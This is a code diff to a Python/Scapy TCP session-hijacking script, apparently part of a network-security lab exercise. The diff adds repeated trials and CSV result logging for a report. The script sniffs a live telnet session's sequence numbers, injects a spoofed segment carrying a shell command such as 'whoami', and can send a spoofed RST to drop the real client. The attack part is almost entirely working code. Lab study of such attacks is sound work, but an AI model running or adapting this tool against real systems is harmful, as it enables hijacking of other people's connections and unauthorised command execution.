@@ -19,16 +19,31 @@ telnet session to the server and is actively typing:
     sudo python3 attacker/tcp_hijack.py --client 192.168.56.10 \
         --server 192.168.56.20 --port 2323 --iface eth1 \
         --payload "whoami"
+
+For the report's plots, repeat the attempt several times against one
+persistent client connection (see RUN.md) and log each trial to CSV:
+    sudo python3 attacker/tcp_hijack.py --client 192.168.56.10 \
+        --server 192.168.56.20 --port 2323 --iface eth1 \
+        --payload "whoami" --trials 10 --trial-interval 5
 """
 
 import argparse
+import csv
+import os
 import time
+from datetime import datetime, timezone
 
 from scapy.all import IP, TCP, Raw, send, sniff
 
 from common import require_lab_targets, setup_logging
 
 log = setup_logging("tcp_hijack")
+
+CSV_FIELDS = [
+    "trial", "timestamp", "client_ip", "server_ip", "port",
+    "captured_seq", "captured_ack", "window", "injected_len",
+    "rst_seen", "ack_advanced", "verdict", "latency_ms",
+]
 
 
 def capture_stream_state(client_ip, server_ip, port, iface, capture_timeout):
@@ -131,6 +146,63 @@ def send_spoofed_rst(server_ip, server_port, client_ip, client_port, seq, iface)
     send(packet, iface=iface, verbose=False)
 
 
+def append_csv_row(csv_path, row):
+    os.makedirs(os.path.dirname(csv_path) or ".", exist_ok=True)
+    write_header = not os.path.exists(csv_path)
+    with open(csv_path, "a", newline="") as f:
+        writer = csv.DictWriter(f, fieldnames=CSV_FIELDS)
+        if write_header:
+            writer.writeheader()
+        writer.writerow(row)
+
+
+def run_trial(trial_num, args):
+    """One capture -> inject -> verify cycle. Returns the CSV row dict so the
+    caller can log it and, across --trials runs, feed a plot."""
+    state = capture_stream_state(args.client, args.server, args.port, args.iface, args.capture_timeout)
+    if not state.get("seen"):
+        log.warning("Trial %d: no client->server segment observed, skipping.", trial_num)
+        return None
+    log.info(
+        "Trial %d: captured seq=%d ack=%d client_port=%d window=%d",
+        trial_num, state["seq"], state["ack"], state["sport"], state["window"],
+    )
+
+    inject_time = time.monotonic()
+    injected_len = send_injected_segment(
+        args.client, state["sport"], args.server, args.port,
+        state["seq"], state["ack"], state["window"], args.payload, args.iface,
+    )
+
+    time.sleep(0.2)
+    result = check_acceptance(args.client, args.server, args.port, state["seq"], injected_len, args.iface, args.watch_timeout)
+    latency_ms = round((time.monotonic() - inject_time) * 1000, 1)
+
+    if result["rst"]:
+        verdict = "rejected"
+    elif result["ack_advanced"]:
+        verdict = "accepted"
+    else:
+        verdict = "inconclusive"
+    log.info("Trial %d RESULT: %s (latency %.1f ms)", trial_num, verdict.upper(), latency_ms)
+
+    return {
+        "trial": trial_num,
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+        "client_ip": args.client,
+        "server_ip": args.server,
+        "port": args.port,
+        "captured_seq": state["seq"],
+        "captured_ack": state["ack"],
+        "window": state["window"],
+        "injected_len": injected_len,
+        "rst_seen": result["rst"],
+        "ack_advanced": result["ack_advanced"],
+        "verdict": verdict,
+        "latency_ms": latency_ms,
+    }, state["sport"], state["ack"]
+
+
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--client", required=True)
@@ -140,39 +212,35 @@ def main():
     parser.add_argument("--payload", default="whoami", help="command/text to inject")
     parser.add_argument("--capture-timeout", type=int, default=20)
     parser.add_argument("--watch-timeout", type=int, default=5)
-    parser.add_argument("--send-rst", action="store_true", help="also reset the real client afterward")
+    parser.add_argument("--send-rst", action="store_true", help="also reset the real client, after the final trial")
+    parser.add_argument("--trials", type=int, default=1, help="repeat the attempt this many times")
+    parser.add_argument("--trial-interval", type=float, default=3.0, help="seconds to wait between trials")
+    parser.add_argument("--csv", default="results/tcp_hijack_results.csv", help="path to append per-trial results")
     args = parser.parse_args()
 
     require_lab_targets(args.client, args.server)
 
-    state = capture_stream_state(args.client, args.server, args.port, args.iface, args.capture_timeout)
-    if not state.get("seen"):
+    last_sport, last_ack = None, None
+    completed = 0
+    for trial_num in range(1, args.trials + 1):
+        outcome = run_trial(trial_num, args)
+        if outcome is None:
+            continue
+        row, last_sport, last_ack = outcome
+        append_csv_row(args.csv, row)
+        completed += 1
+        if trial_num < args.trials:
+            time.sleep(args.trial_interval)
+
+    if completed == 0:
         raise SystemExit(
-            "[ERROR] No client->server segment observed. Make sure arp_spoof.py "
-            "is running and the real client is actively connected/typing."
+            "[ERROR] No trial observed a client->server segment. Make sure arp_spoof.py "
+            "is running and the real client has an open, active connection (see RUN.md)."
         )
-    log.info(
-        "Captured live state: seq=%d ack=%d client_port=%d window=%d",
-        state["seq"], state["ack"], state["sport"], state["window"],
-    )
+    log.info("Done: %d/%d trials logged to %s", completed, args.trials, args.csv)
 
-    injected_len = send_injected_segment(
-        args.client, state["sport"], args.server, args.port,
-        state["seq"], state["ack"], state["window"], args.payload, args.iface,
-    )
-
-    time.sleep(0.2)
-    result = check_acceptance(args.client, args.server, args.port, state["seq"], injected_len, args.iface, args.watch_timeout)
-
-    if result["rst"]:
-        log.info("RESULT: server sent an RST -- injected segment was REJECTED.")
-    elif result["ack_advanced"]:
-        log.info("RESULT: server's ACK advanced past our payload -- injected segment was ACCEPTED.")
-    else:
-        log.info("RESULT: inconclusive -- no RST and no advancing ACK observed within timeout. Check Wireshark.")
-
-    if args.send_rst:
-        send_spoofed_rst(args.server, args.port, args.client, state["sport"], state["ack"], args.iface)
+    if args.send_rst and last_sport is not None:
+        send_spoofed_rst(args.server, args.port, args.client, last_sport, last_ack, args.iface)
 
 
 if __name__ == "__main__":
